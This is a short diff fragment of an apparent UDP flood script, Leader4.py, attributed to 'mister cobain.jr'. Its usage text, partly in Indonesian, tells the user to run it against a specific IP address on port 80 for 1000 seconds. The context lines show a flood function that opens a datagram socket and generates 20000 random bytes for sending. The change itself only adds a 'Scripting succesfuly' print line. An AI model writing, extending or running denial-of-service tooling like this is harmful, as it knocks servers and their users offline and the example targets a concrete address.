@@ -11,7 +11,9 @@ def usage():
 	print ("-Author : mister cobain.jr")
 	print ("(masukan perintah python Leader4.py 194.5.159.78 80 1000)-")
 	print ("")
-	
+	print ("-Scripting succesfuly")
+	print ("")
+	       
 def flood(victim, vport, duration):
 	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	bytes = random._urandom(20000)
